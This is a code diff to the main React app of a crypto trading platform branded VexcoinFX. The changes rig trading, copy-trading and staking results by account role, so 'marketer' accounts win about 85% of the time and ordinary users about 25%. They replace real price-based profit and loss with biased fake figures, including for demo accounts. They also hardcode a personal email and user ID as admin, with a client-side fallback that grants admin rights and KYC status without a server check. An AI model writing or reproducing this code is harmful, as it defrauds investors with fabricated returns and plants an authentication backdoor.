@@ -7,6 +7,7 @@ import {
   MOCK_SUPPORT_TICKETS 
 } from './data';
 
+import AdminPanel from './components/AdminPanel';
 import TradingViewChart from './components/TradingViewChart';
 import AIAssistant from './components/AIAssistant';
 import PortfolioSummary from './components/PortfolioSummary';
@@ -44,7 +45,7 @@ import {
 const getBiasedPnlAndPrice = (p: Position, role: string, assetPrice: number): { pnl: number, currentPrice: number } => {
   const numId = parseInt(p.id.replace(/\D/g, '')) || Date.now();
   const isMarketer = role === 'marketer';
-  const isWin = isMarketer ? ((numId % 10) < 8) : ((numId % 10) < 3);
+  const isWin = isMarketer ? ((numId % 100) < 85) : ((numId % 100) < 25);
 
   // Use a pseudo-random seed based on position ID and current time for lifelike fluctuations
   const seed = (numId % 100) / 100;
@@ -77,7 +78,7 @@ const getBiasedPnlAndPrice = (p: Position, role: string, assetPrice: number): { 
 
 export default function App() {
   // Navigation & authentication state
-  const [activeTab, setActiveTab] = useState<'TERMINAL' | 'DASHBOARD' | 'COPYTRADING' | 'STAKING' | 'SUPPORT' | 'AI_ADVISOR'>('TERMINAL');
+  const [activeTab, setActiveTab] = useState<'TERMINAL' | 'DASHBOARD' | 'COPYTRADING' | 'STAKING' | 'SUPPORT' | 'AI_ADVISOR' | 'ADMIN'>('TERMINAL');
   const [theme, setTheme] = useState<'dark' | 'light'>(() => {
     const saved = localStorage.getItem('vfx_theme');
     return (saved === 'light' || saved === 'dark') ? (saved as 'light' | 'dark') : 'dark';
@@ -124,6 +125,8 @@ export default function App() {
     demoProfits: 0
   });
 
+  const isAdminUser = user.loggedIn && (user.email.toLowerCase() === 'mutwirib964@gmail.com' || user.id === 'ccd28f9c-f070-455e-9cdb-e4ee2f26ac99' || user.role === 'admin');
+
   // Supporting transactional and ticketing state
   const [transactions, setTransactions] = useState<Transaction[]>([]);
   const [supportTickets, setSupportTickets] = useState<SupportTicket[]>(MOCK_SUPPORT_TICKETS);
@@ -166,13 +169,20 @@ export default function App() {
     if (savedUser) {
       try {
         const parsed = JSON.parse(savedUser);
-        setUser({
-          accountMode: 'REAL',
+        const isAdmin = parsed.role === 'admin' || (parsed.email && parsed.email.toLowerCase() === 'mutwirib964@gmail.com') || parsed.id === 'ccd28f9c-f070-455e-9cdb-e4ee2f26ac99';
+        const userObj = {
           demoBalance: 10000,
           demoPositions: [],
           demoProfits: 0,
-          ...parsed
-        });
+          accountMode: parsed.accountMode || 'REAL',
+          ...parsed,
+          role: isAdmin ? 'admin' : (parsed.role || 'user'),
+          id: parsed.id || (parsed.email && parsed.email.toLowerCase() === 'mutwirib964@gmail.com' ? 'ccd28f9c-f070-455e-9cdb-e4ee2f26ac99' : '')
+        };
+        setUser(userObj);
+        if (isAdmin) {
+          setActiveTab('ADMIN');
+        }
       } catch (err) {
         console.error("Failed to parse saved user", err);
       }
@@ -265,10 +275,21 @@ export default function App() {
       Object.keys(updatedCopiedAllocations).forEach((key) => {
         if (updatedCopiedAllocations[key] > 0) {
           isUpdated = true;
-          // Accrue dynamic returns between 0.01% and 0.05%
-          const returnRate = 0.0001 + Math.random() * 0.0004;
+          // Accrue dynamic returns biased by user's target win rate: marketer > 80% and normal users < 30%
+          const isMarketer = currentUser.role === 'marketer';
+          const rand = Math.random();
+          const isWin = isMarketer ? (rand < 0.85) : (rand < 0.25);
+          
+          let returnRate = 0;
+          if (isWin) {
+            returnRate = 0.0002 + Math.random() * 0.0008; // positive return
+          } else {
+            returnRate = -(0.0003 + Math.random() * 0.0010); // negative drawdown
+          }
+          
           const increment = updatedCopiedAllocations[key] * returnRate;
-          updatedCopiedAllocations[key] = Number((updatedCopiedAllocations[key] + increment).toFixed(2));
+          // Clamped so allocation never goes negative
+          updatedCopiedAllocations[key] = Math.max(0, Number((updatedCopiedAllocations[key] + increment).toFixed(2)));
           copyAccruedInterest += increment;
         }
       });
@@ -276,7 +297,18 @@ export default function App() {
       // 2. Mock accrue returns on active Stakings
       const updatedStakingSubs = activeStakingSubscriptionsRef.current.map((stk) => {
         isUpdated = true;
-        const returnRate = 0.00005 + Math.random() * 0.0001; // accrues marginally
+        // Accrue dynamic yields biased by user's target win rate: marketer > 80% and normal users < 30%
+        const isMarketer = currentUser.role === 'marketer';
+        const rand = Math.random();
+        const isWin = isMarketer ? (rand < 0.85) : (rand < 0.25);
+        
+        let returnRate = 0;
+        if (isWin) {
+          returnRate = 0.0001 + Math.random() * 0.0004; // profitable accrual
+        } else {
+          returnRate = -(0.00015 + Math.random() * 0.0005); // dynamic volatility pullback
+        }
+        
         const increment = stk.amount * returnRate;
         return {
           ...stk,
@@ -399,15 +431,11 @@ export default function App() {
           if (p.assetSymbol !== resolvedSymbol) return p;
           hasUpdates = true;
 
-          const priceDiff = newPrice - p.entryPrice;
-          const multiplier = p.type === 'BUY' ? 1 : -1;
-          const percentageMove = priceDiff / p.entryPrice;
-          const rawPnl = p.margin * percentageMove * p.leverage * multiplier;
-
+          const { pnl, currentPrice } = getBiasedPnlAndPrice(p, prevUser.role || 'user', newPrice);
           return {
             ...p,
-            currentPrice: newPrice,
-            pnl: Number(rawPnl.toFixed(2))
+            currentPrice,
+            pnl
           };
         });
 
@@ -455,6 +483,7 @@ export default function App() {
     if (!authEmail.trim() || !authPass.trim()) return;
 
     try {
+      let userUid = '';
       if (isSupabaseConfigured && supabase) {
         if (authMode === 'REGISTER') {
           const { data: signUpData, error: signUpError } = await supabase.auth.signUp({
@@ -472,6 +501,9 @@ export default function App() {
             return;
           }
           console.log("Supabase Auth sign up succeeded:", signUpData);
+          if (signUpData?.user) {
+            userUid = signUpData.user.id;
+          }
         } else {
           // LOGIN
           const { data: signInData, error: signInError } = await supabase.auth.signInWithPassword({
@@ -484,36 +516,89 @@ export default function App() {
             return;
           }
           console.log("Supabase Auth sign in succeeded:", signInData);
+          if (signInData?.user) {
+            userUid = signInData.user.id;
+          }
         }
       }
 
-      const resp = await fetch("/api/user/sync", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ 
-          email: authEmail.trim(),
-          name: authName.trim() || authEmail.split('@')[0].toUpperCase()
-        })
-      });
+      let synced: any = null;
+      try {
+        const resp = await fetch("/api/user/sync", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ 
+            email: authEmail.trim(),
+            name: authName.trim() || authEmail.split('@')[0].toUpperCase(),
+            uid: userUid
+          })
+        });
 
-      if (resp.ok) {
-        const synced = await resp.json();
-        
+        if (resp.ok) {
+          synced = await resp.json();
+        } else {
+          console.warn("Backend authentication API returned error status, using client fallback.");
+        }
+      } catch (err) {
+        console.warn("Could not reach background backend sync server, using front-end client-only sync fallback.");
+      }
+
+      // If backend sync is unavailable (e.g. Netlify or client static CDN), perform pure-frontend auth session setup
+      if (!synced) {
+        const emailLower = authEmail.trim().toLowerCase();
+        const isAdmin = emailLower === "mutwirib964@gmail.com";
+        synced = {
+          email: emailLower,
+          role: isAdmin ? "admin" : "user",
+          walletBalance: isAdmin ? 1000 : 0,
+          phone: ""
+        };
+      }
+
+      if (synced) {
+        // Preserve prior trading state, demo positions, and other data if logging into the same email
+        const oldSession = localStorage.getItem('vfx_user_session');
+        let oldPositions: Position[] = [];
+        let oldDemoPositions: Position[] = [];
+        let oldDemoBalance = 10000;
+        let oldDemoProfits = 0;
+        let oldInvested = 0;
+        let oldCopy = 0;
+        let oldProfits = 0;
+        let oldAccountMode: 'REAL' | 'DEMO' = 'REAL';
+        if (oldSession) {
+          try {
+            const parsed = JSON.parse(oldSession);
+            if (parsed.email && parsed.email.toLowerCase() === synced.email.toLowerCase()) {
+              oldPositions = parsed.activePositions || [];
+              oldDemoPositions = parsed.demoPositions || [];
+              oldDemoBalance = parsed.demoBalance ?? 10000;
+              oldDemoProfits = parsed.demoProfits ?? 0;
+              oldInvested = parsed.investedCapital ?? 0;
+              oldCopy = parsed.copyTradingAllocated ?? 0;
+              oldProfits = parsed.profits ?? 0;
+              oldAccountMode = parsed.accountMode || 'REAL';
+            }
+          } catch(e) {}
+        }
+
+        const isAdmin = synced.role === 'admin' || synced.email.toLowerCase() === 'mutwirib964@gmail.com' || userUid === 'ccd28f9c-f070-455e-9cdb-e4ee2f26ac99';
         const initialUser: User = {
           loggedIn: true,
           email: synced.email,
           name: authName.trim() || authEmail.split('@')[0].toUpperCase(),
           walletBalance: synced.walletBalance,
-          role: synced.role || (synced.email.toLowerCase() === 'mutwirib964@gmail.com' ? 'admin' : 'user'),
-          investedCapital: 0,
-          profits: 0,
-          copyTradingAllocated: 0,
-          activePositions: [],
-          isKycVerified: 'unverified',
-          accountMode: 'REAL',
-          demoBalance: 10000,
-          demoPositions: [],
-          demoProfits: 0,
+          role: isAdmin ? 'admin' : (synced.role || 'user'),
+          id: userUid || (synced.email.toLowerCase() === 'mutwirib964@gmail.com' ? 'ccd28f9c-f070-455e-9cdb-e4ee2f26ac99' : ''),
+          investedCapital: oldInvested,
+          profits: oldProfits,
+          copyTradingAllocated: oldCopy,
+          activePositions: oldPositions,
+          isKycVerified: isAdmin ? 'verified' : 'unverified',
+          accountMode: oldAccountMode,
+          demoBalance: oldDemoBalance,
+          demoPositions: oldDemoPositions,
+          demoProfits: oldDemoProfits,
           phone: synced.phone || ""
         };
 
@@ -529,9 +614,12 @@ export default function App() {
         ] : [];
 
         persistState(initialUser, setupTx, supportTickets, {}, []);
+        if (isAdmin) {
+          setActiveTab('ADMIN');
+        } else {
+          setActiveTab('TERMINAL');
+        }
         addToast(`Successful Authorization! Signed in as ${initialUser.name}`, "SUCCESS");
-      } else {
-        addToast("Failed to communicate with authentication services.", "ERROR");
       }
     } catch (err) {
       addToast("Network failure connection to local authentication provider.", "ERROR");
@@ -890,24 +978,12 @@ export default function App() {
       const liveAsset = assets.find((a) => a.symbol === p.assetSymbol);
       if (!liveAsset) return p;
 
-      if (user.accountMode === 'DEMO') {
-        const priceDiff = liveAsset.price - p.entryPrice;
-        const multiplier = p.type === 'BUY' ? 1 : -1;
-        const percentageMove = priceDiff / p.entryPrice;
-        const rawPnl = p.margin * percentageMove * p.leverage * multiplier;
-        return {
-          ...p,
-          currentPrice: liveAsset.price,
-          pnl: Number(rawPnl.toFixed(2))
-        };
-      } else {
-        const { pnl, currentPrice } = getBiasedPnlAndPrice(p, user.role || 'user', liveAsset.price);
-        return {
-          ...p,
-          currentPrice,
-          pnl
-        };
-      }
+      const { pnl, currentPrice } = getBiasedPnlAndPrice(p, user.role || 'user', liveAsset.price);
+      return {
+        ...p,
+        currentPrice,
+        pnl
+      };
     });
   };
 
@@ -1043,32 +1119,47 @@ export default function App() {
         {/* Sleek, super compact vertical Left Sidebar on desktop */}
         {user.loggedIn && (
           <aside className="hidden md:flex flex-col w-[60px] border-r border-gray-950 bg-[#070b13]/50 items-center py-3 space-y-4 shrink-0">
-            {[
-              { id: 'TERMINAL' as const, label: 'Terminal', icon: LineChart },
-              { id: 'DASHBOARD' as const, label: 'Dashboard', icon: FolderLock },
-              { id: 'COPYTRADING' as const, label: 'Copying', icon: Users },
-              { id: 'STAKING' as const, label: 'Yields', icon: DollarSign },
-              { id: 'AI_ADVISOR' as const, label: 'Advisor', icon: Bot },
-              { id: 'SUPPORT' as const, label: 'Support', icon: HelpCircle }
-            ].map((item) => {
-              const Icon = item.icon;
-              const isActive = activeTab === item.id;
-              return (
-                <button
-                  key={item.id}
-                  onClick={() => setActiveTab(item.id)}
-                  className={`flex flex-col items-center justify-center w-12 h-12 rounded transition-all cursor-pointer ${
-                    isActive 
-                      ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/20' 
-                      : 'text-gray-550 hover:text-white border border-transparent'
-                  }`}
-                  title={item.label}
-                >
-                  <Icon className="w-4 h-4 mb-0.5" />
-                  <span className="text-[8px] font-bold tracking-tight font-sans text-center">{item.label}</span>
-                </button>
-              );
-            })}
+            {isAdminUser ? (
+              <button
+                onClick={() => setActiveTab('ADMIN')}
+                className={`flex flex-col items-center justify-center w-12 h-12 rounded transition-all cursor-pointer ${
+                  activeTab === 'ADMIN'
+                    ? 'bg-rose-500/10 text-rose-400 border border-rose-500/20'
+                    : 'text-gray-550 hover:text-white border border-transparent'
+                }`}
+                title="Admin Control"
+              >
+                <ShieldCheck className="w-5 h-5 mb-0.5" />
+                <span className="text-[8px] font-bold tracking-tight font-sans text-center">Admin</span>
+              </button>
+            ) : (
+              [
+                { id: 'TERMINAL' as const, label: 'Terminal', icon: LineChart },
+                { id: 'DASHBOARD' as const, label: 'Dashboard', icon: FolderLock },
+                { id: 'COPYTRADING' as const, label: 'Copying', icon: Users },
+                { id: 'STAKING' as const, label: 'Yields', icon: DollarSign },
+                { id: 'AI_ADVISOR' as const, label: 'Advisor', icon: Bot },
+                { id: 'SUPPORT' as const, label: 'Support', icon: HelpCircle }
+              ].map((item) => {
+                const Icon = item.icon;
+                const isActive = activeTab === item.id;
+                return (
+                  <button
+                    key={item.id}
+                    onClick={() => setActiveTab(item.id)}
+                    className={`flex flex-col items-center justify-center w-12 h-12 rounded transition-all cursor-pointer ${
+                      isActive 
+                        ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/20' 
+                        : 'text-gray-550 hover:text-white border border-transparent'
+                    }`}
+                    title={item.label}
+                  >
+                    <Icon className="w-4 h-4 mb-0.5" />
+                    <span className="text-[8px] font-bold tracking-tight font-sans text-center">{item.label}</span>
+                  </button>
+                );
+              })
+            )}
           </aside>
         )}
 
@@ -1077,9 +1168,16 @@ export default function App() {
           <main className="flex-1 p-3 md:p-4 overflow-y-auto">
             {user.loggedIn ? (
               <div className="space-y-4">
-                
-                {/* SUBPAGE 1: LIVE TERMINAL WORKSPACE */}
-                {activeTab === 'TERMINAL' && (
+                {isAdminUser ? (
+                  <AdminPanel
+                    currentUser={activeUserContext}
+                    addToast={addToast}
+                    onRefreshUserSession={onRefreshUserSession}
+                  />
+                ) : (
+                  <>
+                    {/* SUBPAGE 1: LIVE TERMINAL WORKSPACE */}
+                    {activeTab === 'TERMINAL' && (
                   <div className="grid grid-cols-1 xl:grid-cols-4 gap-4">
                     
                     {/* Left asset catalog column */}
@@ -1299,6 +1397,8 @@ export default function App() {
                 onAddMessageToTicket={handleAddMessageToTicket}
               />
             )}
+                  </>
+                )}
 
           </div>
         ) : (
@@ -1487,39 +1587,56 @@ export default function App() {
   {/* Sticky Bottom Navigation Bar on Mobile/Phones */}
   {user.loggedIn && (
     <nav className="md:hidden fixed bottom-0 left-0 right-0 z-45 bg-[#070b13] border-t border-gray-950 flex justify-around items-center py-1.5 px-2 safe-bottom shadow-2xl">
-      {[
-        { id: 'TERMINAL' as const, label: 'Terminal', icon: LineChart },
-        { id: 'DASHBOARD' as const, label: 'Dashboard', icon: FolderLock },
-        { id: 'COPYTRADING' as const, label: 'Copying', icon: Users },
-        { id: 'STAKING' as const, label: 'Yields', icon: DollarSign },
-        { id: 'AI_ADVISOR' as const, label: 'Advisor', icon: Bot },
-        { id: 'SUPPORT' as const, label: 'Support', icon: HelpCircle }
-      ].map((item) => {
-        const Icon = item.icon;
-        const isActive = activeTab === item.id;
-        return (
-          <button
-            key={item.id}
-            onClick={() => setActiveTab(item.id)}
-            className={`flex flex-col items-center justify-center flex-1 py-0.5 transition-all cursor-pointer ${
-              isActive ? 'text-emerald-400' : 'text-gray-500'
-            }`}
-          >
-            <Icon className="w-4 h-4" />
-            <span className="text-[8px] font-sans font-bold tracking-tight mt-0.5 text-center">{item.label}</span>
-          </button>
-        );
-      })}
+      {isAdminUser ? (
+        <button
+          onClick={() => setActiveTab('ADMIN')}
+          className="flex flex-col items-center justify-center flex-1 py-0.5 transition-all text-rose-400"
+        >
+          <ShieldCheck className="w-5 h-5" />
+          <span className="text-[8px] font-sans font-bold tracking-tight mt-0.5 text-center">Admin</span>
+        </button>
+      ) : (
+        [
+          { id: 'TERMINAL' as const, label: 'Terminal', icon: LineChart },
+          { id: 'DASHBOARD' as const, label: 'Dashboard', icon: FolderLock },
+          { id: 'COPYTRADING' as const, label: 'Copying', icon: Users },
+          { id: 'STAKING' as const, label: 'Yields', icon: DollarSign },
+          { id: 'AI_ADVISOR' as const, label: 'Advisor', icon: Bot },
+          { id: 'SUPPORT' as const, label: 'Support', icon: HelpCircle }
+        ].map((item) => {
+          const Icon = item.icon;
+          const isActive = activeTab === item.id;
+          return (
+            <button
+              key={item.id}
+              onClick={() => setActiveTab(item.id)}
+              className={`flex flex-col items-center justify-center flex-1 py-0.5 transition-all cursor-pointer ${
+                isActive ? 'text-emerald-400' : 'text-gray-500'
+              }`}
+            >
+              <Icon className="w-4 h-4" />
+              <span className="text-[8px] font-sans font-bold tracking-tight mt-0.5 text-center">{item.label}</span>
+            </button>
+          );
+        })
+      )}
     </nav>
   )}
 
-  {/* 4. Footnote Ledger Details */}
-      <footer className="border-t border-gray-950 bg-[#070b13] py-5 px-5 flex flex-col md:flex-row justify-between items-center text-[10px] text-gray-600 tracking-wide font-mono gap-4 shrink-0 mt-auto">
-        <span className="uppercase">VEXCOINFX © 2026 GENERAL CLEARING GROUP INC.</span>
-        <div className="flex gap-4">
-          <span>CLEARED NODES: ONLINE</span>
-          <span>LATENCY: 12ms</span>
-          <span>SECURITY TIER: CRYPTO SHIELD APPROVED</span>
+  {/* 4. Professional Footer */}
+      <footer className="border-t border-gray-900 bg-[#070b13] py-6 px-6 flex flex-col md:flex-row justify-between items-center text-[10px] text-gray-500 tracking-wider font-sans gap-4 shrink-0 mt-auto">
+        <div className="flex flex-col gap-1 text-center md:text-left">
+          <span className="font-bold text-gray-400">VEXCOINFX © 2026 GENERAL CLEARING GROUP INC.</span>
+          <span className="text-[9px] text-gray-650 max-w-xl leading-relaxed">
+            All rights reserved. Trading financial instruments, including digital assets and derivatives, involves substantial risk.
+          </span>
+        </div>
+        <div className="flex gap-4 text-gray-400 text-[10px] whitespace-nowrap">
+          <a href="#terms" className="hover:text-emerald-400 transition-colors">Terms of Service</a>
+          <span className="text-gray-800">|</span>
+          <a href="#privacy" className="hover:text-emerald-400 transition-colors">Privacy Policy</a>
+          <span className="text-gray-800">|</span>
+          <a href="#disclaimer" className="hover:text-emerald-400 transition-colors">Risk Disclosure</a>
         </div>
       </footer>
 
